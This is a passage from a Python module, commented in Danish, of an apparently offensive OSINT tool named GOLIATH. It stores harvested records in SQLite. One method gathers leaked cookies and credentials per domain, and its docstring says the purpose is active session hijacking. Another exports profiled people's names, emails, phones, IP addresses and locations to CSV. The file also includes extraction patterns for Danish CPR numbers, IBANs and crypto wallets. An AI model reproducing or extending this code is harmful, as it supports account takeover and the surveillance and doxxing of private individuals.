                            conn.execute("UPDATE global_search_index SET search_text = ? WHERE source_table='osint_records' AND entity_id=?", (clean_json, row_id))
                            purged_count += 1
                    except json.JSONDecodeError: pass
                if purged_count > 0:
                    logger.info(f"🧹 GOLIATH PURGE: Rensede forældet HTML bloat fra {purged_count} gamle records.")
        except Exception as e:
            logger.error(f"Fejl under Ephemeral HTML Purge: {e}")

    def get_domain_artefacts(self, domain: str) -> List[Tuple]:
        """
        GOLIATH EXPANSION: Henter alle lækkede artefakter (cookies, credentials, rå data)
        knyttet til et specifikt domæne for at forberede aktiv Session Hijacking.
        """
        try:
            with sqlite3.connect(self.db_path) as conn:
                # Tillader partial match på tværs af både target URL og den rå JSON blob
                search_term = f"%{domain}%"
                cursor = conn.execute(
                    "SELECT id, source_module, data_json FROM osint_records WHERE target LIKE ? OR data_json LIKE ?",
                    (search_term, search_term)
                )
                records = cursor.fetchall()
                logger.info(f"OmniDataLake: Fandt {len(records)} relaterede poster for domænet '{domain}'.")
                return records
        except sqlite3.Error as e:
            logger.error(f"Databasefejl under domænesøgning: {e}")
            return []

    def get_harvested_targets(self, source_module: str = "mod_scor%") -> List[Tuple]:
        """
        GOLIATH EXPANSION: Trækker en unik liste over alle mål høstet af et specifikt modul.
        Returnerer (target_navn, seneste_timestamp).
        """
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.execute("SELECT target, MAX(timestamp) FROM osint_records WHERE source_module LIKE ? GROUP BY target ORDER BY MAX(timestamp) DESC", (source_module,))
                return cursor.fetchall()
        except sqlite3.Error as e:
            logger.error(f"Databasefejl under hentning af loot: {e}")
            return []

    def run_nlp_threat_analysis(self) -> Dict[str, Any]:
        """
        GOLIATH EXPANSION (NLP): Bruger Machine Learning (TF-IDF & K-Means clustering) 
        til at analysere al høstet fritekst og finde skjulte trusselsmønstre eller anomalier.
        """
        if not has_sklearn:
            return {"error": "scikit-learn mangler. Kør: pip install scikit-learn"}
            
        try:
            with sqlite3.connect(self.db_path) as conn:
                # Hent fritekst fra Master Personas og Search Index
                cursor = conn.execute("SELECT entity_id, search_text FROM global_search_index WHERE source_table='master_personas'")
                records = cursor.fetchall()
                
                if len(records) < 5:
                    return {"error": "For lidt data i databasen til ML-clustering. Høst flere profiler."}

                ids = [r[0] for r in records]
                texts = [str(r[1]).lower() for r in records]

                # Vektoriserer teksten (fjerner almindelige ord, fremhæver unikke trusselsord)
                vectorizer = TfidfVectorizer(stop_words='english', max_features=1000)
                X = vectorizer.fit_transform(texts)

                # Klynge-analyse (Opdeler i 3 arketyper automatisk)
                num_clusters = 3
                km = KMeans(n_clusters=num_clusters, random_state=42, n_init=10)
                km.fit(X)

                # Saml resultaterne
                clusters = {f"Cluster_{i}": [ids[j] for j in range(len(ids)) if km.labels_[j] == i] for i in range(num_clusters)}
                return {"status": "success", "total_analyzed": len(ids), "clusters": clusters}
        except Exception as e:
            return {"error": f"NLP Fejl: {e}"}

    def export_cluster_to_csv(self, cluster_name: str, nlp_results: Dict[str, Any]) -> str:
        """
        GOLIATH EXPANSION: Eksporterer en specifik NLP-klynge fra ML-analysen 
        til en Excel-kompatibel CSV-fil (med UTF-8 BOM) for videre efterforskning.
        """
        if "clusters" not in nlp_results or cluster_name not in nlp_results["clusters"]:
            logger.error(f"OmniDataLake: Klyngen '{cluster_name}' blev ikke fundet i NLP-data.")
            return ""
            
        entity_ids = nlp_results["clusters"][cluster_name]
        if not entity_ids:
            logger.warning(f"OmniDataLake: Klyngen '{cluster_name}' er tom. Intet at eksportere.")
            return ""

        # Sikker filsti i det aktive workspace med timestamp
        filename = f"GOLIATH_NLP_EXPORT_{cluster_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        filepath = Path(session.get("loot_folder", get_active_workspace())) / filename
        
        try:
            with sqlite3.connect(self.db_path) as conn:
                # Sikker parameteriseret forespørgsel med IN-klausul
                placeholders = ','.join('?' for _ in entity_ids)
                query = f"SELECT id, name, email, phone, social_handle, last_ip, location FROM master_personas WHERE id IN ({placeholders})"
                cursor = conn.execute(query, entity_ids)
                rows = cursor.fetchall()
                
            # Skriv til CSV med UTF-8 BOM for Microsoft Excel kompatibilitet
            with open(filepath, 'w', newline='', encoding='utf-8-sig') as f:
                writer = csv.writer(f, delimiter=';')
                writer.writerow(["ID", "Navn", "Email", "Telefon", "Alias", "IP-Adresse", "Lokation"])
                for row in rows:
                    writer.writerow(row)
                    
            logger.info(f"✅ NLP Klynge '{cluster_name}' eksporteret succesfuldt til: {filepath}")
            return str(filepath)
            
        except Exception as e:
            logger.error(f"Fejl ved CSV eksport af NLP klynge: {e}")
            return ""

    def save_to_json(self, data: Dict[str, Any], filename: str, encrypt: bool = False, sanitize_pii: bool = False) -> str:
        filepath = self.base_dir / f"{sanitize_filename(filename)}.json"
        json_data = json.dumps(data, indent=4, ensure_ascii=False)
        
        if sanitize_pii: json_data = PIISanitizer.redact_pii(json_data)
        if encrypt:
            filepath = filepath.with_suffix(".json.enc")
            filepath.write_text(crypto.encrypt(json_data))
        else:
            filepath.write_text(json_data, encoding='utf-8')
            
        return str(filepath)

datalake = OmniDataLake()
def save_to_json(data: Dict[str, Any], filename: str, encrypt: bool = False) -> None:
    datalake.save_to_json(data, filename, encrypt)

# ==========================================
# 🔹 9. BACKWARDS COMPATIBILITY LAYER
# ==========================================
REGEX_EMAIL = ThreatIntelExtractor.PATTERNS["email"]
REGEX_CPR = ThreatIntelExtractor.PATTERNS["danish_cpr"]
REGEX_CVR = ThreatIntelExtractor.PATTERNS["danish_cvr"]
REGEX_BTC = ThreatIntelExtractor.PATTERNS["crypto_btc"]
REGEX_ETH = ThreatIntelExtractor.PATTERNS["crypto_eth"]
REGEX_XMR = ThreatIntelExtractor.PATTERNS["crypto_xmr"]
REGEX_IBAN = ThreatIntelExtractor.PATTERNS["iban"]
REGEX_IPV4 = ThreatIntelExtractor.PATTERNS["ipv4"]
REGEX_MAC = ThreatIntelExtractor.PATTERNS["mac"]

def extract_danish_phones(text: str) -> Set[str]:
    return ThreatIntelExtractor.extract_danish_phones(text)

def validate_danish_address(text: str) -> Optional[Dict[str, str]]:
    """Basic extraction of Danish addresses for backward compatibility."""
    match = re.search(r'([A-ZÆØÅ][a-zæøåA-ZÆØÅ\s\.\-]+?\s\d+[A-Z0-9a-z]*?)\s*,\s*(\d{4})\s+([A-ZÆØÅ][a-zæøåA-ZÆØÅ\s\-]+)', text)
    if match:
        return {
            "vej": match.group(1).strip(),
            "post": match.group(2).strip(),
            "by": match.group(3).strip(),
            "full": f"{match.group(1).strip()}, {match.group(2).strip()} {match.group(3).strip()}"
        }
    return None